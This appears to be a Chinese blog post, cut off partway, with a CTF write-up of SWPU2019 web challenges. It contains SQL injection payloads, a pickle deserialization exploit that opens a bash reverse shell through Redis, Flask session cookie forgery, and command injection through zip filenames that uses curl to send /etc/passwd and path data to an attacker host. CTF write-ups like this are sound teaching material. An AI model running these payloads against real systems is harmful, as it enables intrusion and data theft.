@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言题目蛮不错的，学到了一些有意思的地方 Web1开始的时候没放不是xss的提示..就有点坑，当xss做了很久.. 广告标题处存在注入，测试 1’xa,点击广告详情，发现报错，确认注入点 过滤了空格，用&#x2F;**&#x2F;代替就好了，因为这个是有回显的，所以直接用union select就行…(22字段是真的狠..，这里代替union select去测字段除了order by 还有group by ,payl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SWPU2019-Web题解">
+<meta property="og:url" content="http://yoursite.com/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="前言题目蛮不错的，学到了一些有意思的地方 Web1开始的时候没放不是xss的提示..就有点坑，当xss做了很久.. 广告标题处存在注入，测试 1’xa,点击广告详情，发现报错，确认注入点 过滤了空格，用&#x2F;**&#x2F;代替就好了，因为这个是有回显的，所以直接用union select就行…(22字段是真的狠..，这里代替union select去测字段除了order by 还有group by ,payl">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/10/QBQrkj.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/10/QD8s0K.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/10/QDrHsS.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/10/QrSnL6.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/11/Qsubsf.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/11/QsMQ9s.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/11/QrfOEV.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/11/QrhkE6.md.png">
+<meta property="article:published_time" content="2019-12-11T11:52:10.000Z">
+<meta property="article:modified_time" content="2019-12-11T11:53:20.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/12/10/QBQrkj.md.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/11/SWPU2019-Web题解/"/>
+
+
+
+
+
+  <title>SWPU2019-Web题解 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SWPU2019-Web题解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-11T19:52:10+08:00">
+                2019-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>题目蛮不错的，学到了一些有意思的地方</p>
+<h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>开始的时候没放不是xss的提示..就有点坑，当xss做了很久..</p>
+<p>广告标题处存在注入，测试 1’xa,点击广告详情，发现报错，确认注入点</p>
+<p>过滤了空格，用/**/代替就好了，因为这个是有回显的，所以直接用union select就行…(22字段是真的狠..，这里代替union select去测字段除了order by 还有group by ,payload为 group by 22,’1,在确认字段数为22后，开始注入，因为过滤了or，所以无法通过information….这样的payload拿到表名，不过可以想起想到时间看到的bypass information_schema，又看了下数据库的版本是八点多的，满足条件，用sys.schema_auto_increment_columns bypass下payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>拿到两个表名，一个是广告表名，一个是用户表，想着注入试试admin的密码</p>
+<p>然后就是一个常规的无列名注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;c&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x&#x2F;**&#x2F;limit&#x2F;**&#x2F;1,1),3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>拿到了一个md5值，去somd5解了一下，拿到flag</p>
+<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>登陆进去提示redis，github找了一个弱密码测试脚本，发现密码是password，当时想两个思路，一个是通过redis主从复制去RCE，第二个是结合登陆去python 反序列化RCE</p>
+<p>redis的主从复制rce受到的限制蛮大的，config等关键命令都被过滤了，目前应该也没有这种过滤关键命令的Bypass 方法，所以还是考虑用Python反序列化去rce</p>
+<p>这里py2和py3的数据还是有一些差异的，当时没太细看，直接py3打redis了，后来发现这是py2</p>
+<p><a href="https://imgse.com/i/QBQrkj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QBQrkj.md.png" alt="QBQrkj.md.png"></a></p>
+<p>从上图看下对比.</p>
+<p>二者生成的区别还是蛮大的，而这道题去get session看一下，明显是python2生成的，所以用py2打就可以了</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">		s = <span class="string">"bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1"</span></span><br><span class="line">		<span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">r = redis.Redis(host=<span class="string">'114.67.109.247'</span>,password=<span class="string">"password"</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line">r.set(<span class="string">"session:your_session"</span>, s)</span><br></pre></td></tr></table></figure>
+
+<p>打之后刷新一下，vps上监听一下，获得反弹过来的shell</p>
+<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>随便用户名和密码上去之后，发现有个upload功能，不过没有权限，怀疑可能是伪造用户这样,而且还看到了jwt，不过开始一直没看到secret key</p>
+<p>login界面的源码是有提示404 not found的…，随便访问一个不存在的路由，拿到secret key为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure>
+
+<p>之后就开始伪造jwt了，首先解密下目前的jwt</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py decode -c <span class="string">"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTExMSIsInVzZXJuYW1lIjoiMTExMTEifQ.Xe9dTA.0muECEr4tz5rfatCoCkOpbMqxns"</span> -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">u'username'</span>: <span class="string">u'11111'</span>, <span class="string">u'password'</span>: <span class="string">u'1111'</span>, <span class="string">u'id'</span>: <span class="string">'100'</span>, <span class="string">u'is_login'</span>: <span class="literal">True</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一般在开发中第一个用户都是admin，尝试将id改为1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py encode -t <span class="string">"&#123;u'username': u'11111', u'password': u'1111', u'id': '1', u'is_login': True&#125;"</span> -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span></span><br><span class="line"></span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTExMSIsInVzZXJuYW1lIjoiMTExMTEifQ.Xe9eCA<span class="number">.7</span>pipbqFINq5xl2Qhu0jl_IO0ynM</span><br></pre></td></tr></table></figure>
+
+<p>改下jwt刷新一下就可以上传了，并且拿到源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到两个路由 upload 和 showflag，showflag告诉我们flag位置是./flag/flag.jpg，那么就可以看一下upload路由对应的代码</p>
+<p>逻辑比较简单，就是把文件解压到指定的文件夹，限定了只能上传zip,并且解压后的文件名中不能有/</p>
+<p>这里的cmd做了拼接，存在命令注入</p>
+<p>比如设置文件名为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; curl vps&amp;&amp;.zip</span><br></pre></td></tr></table></figure>
+
+<p>监听vps可收到请求，由于是没有回显的命令执行，所以我们的目的是将执行结果外带出去，但这里限制了/这个字符，就很难去拿到我们的flag,不过大多数unzip都可以结合软连接去攻击，不过软连接是需要获得路径的，我们首先可以通过pwd或者/proc/self/cwd/去读flag</p>
+<p><strong>pwd读法的payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; curl 139.224.236.99:9003 -d &#96;pwd&#96;&amp;.zip</span><br></pre></td></tr></table></figure>
+
+<p>拿到路径为/ctf/hgfjakshgfuasguiasguiaaui/myflask</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg shell</span><br><span class="line"></span><br><span class="line">zip -y shell.zip shell</span><br></pre></td></tr></table></figure>
+
+<p>上传上去，回显看到flag图片，这个代码还比较友好直接把路径下的图片response回来了，不用自己在看md5的ip之类的探测路径了</p>
+<p><strong>/proc/self/cwd读法</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg shell</span><br><span class="line">zip -ry shell.zip shell</span><br></pre></td></tr></table></figure>
+
+<p><strong>/proc/self/environ读法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;proc&#x2F;self&#x2F;environ shell</span><br><span class="line">zip -y qqq.zip shell</span><br></pre></td></tr></table></figure>
+
+<p>拿到回显内容为</p>
+<p><a href="https://imgse.com/i/QD8s0K" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QD8s0K.md.png" alt="QD8s0K.md.png"></a></p>
+<p>接下来步骤就一样了</p>
+<p>看到其他师傅做法有用awk 声明个 /这样做的，payload如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(III=`awk <span class="string">'BEGIN&#123;printf \"%c\", 47&#125;'</span>`&amp;&amp;curl xxx.xxx.xxx.xxx:9999 -T `<span class="built_in">echo</span> <span class="variable">$&#123;III&#125;</span>ctf<span class="variable">$&#123;III&#125;</span>hgfjakshgfuasguiasguiaaui<span class="variable">$&#123;III&#125;</span>myflask<span class="variable">$&#123;III&#125;</span>flag<span class="variable">$&#123;III&#125;</span>flag.jpg`).zip</span></span><br></pre></td></tr></table></figure>
+
+<p>还可以在sesssion[‘name’]处进行命令注入，比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp; curl xx -d &quot;@&#x2F;etc&#x2F;passwd&quot; #</span><br><span class="line">&amp; curl xx -T &#x2F;etc&#x2F;passwd #</span><br><span class="line">&amp; curl xx -F file&#x3D;@&#x2F;etc&#x2F;passwd #</span><br></pre></td></tr></table></figure>
+
+<h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>进来也是一个登陆界面</p>
+<p>admin admin 正常返回</p>
+<p>admin’ admin 500报错</p>
+<p>存在注入问题</p>
+<p>有些时候瞎猜想也挺浪费时间的….</p>
+<p>开始的时候试了 11’ or 发现正常返回了，有点迷惑，就开始了一些不切实际的猜想..最后拿到代码发现这个过滤挺神奇的，存在sql注入关键词的话，直接把用户名变成test…</p>
+<p>但是出题人还是给了挺明确的hint的，PDO,一般PDO可能会存在堆叠注入的问题</p>
+<p>这道题也是存在堆叠注入的测试一下payload，这里选的select sleep(3)测试</p>
+<p><a href="https://imgse.com/i/QDrHsS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QDrHsS.md.png" alt="QDrHsS.md.png"></a></p>
+<p>成功延时3s，接下来常规注入就可以，最后发现flag表flag字段注入出来是</p>
+<p>个AmOL#T.zip，实际需要访问AmOL%23T.zip拿到源码，源码的漏洞还是比较简单的</p>
+<p>userindex.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($img_file)) &#123;</span><br><span class="line">     $img_file = <span class="string">'/../favicon.ico'</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> $img_dir = dirname(<span class="keyword">__FILE__</span>) . $img_file;</span><br><span class="line"> $img_base64 = imgToBase64($img_dir);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span> . $img_base64 . <span class="string">'"&gt;'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码会把文件以base64的形式输出出来，寻找触发点</p>
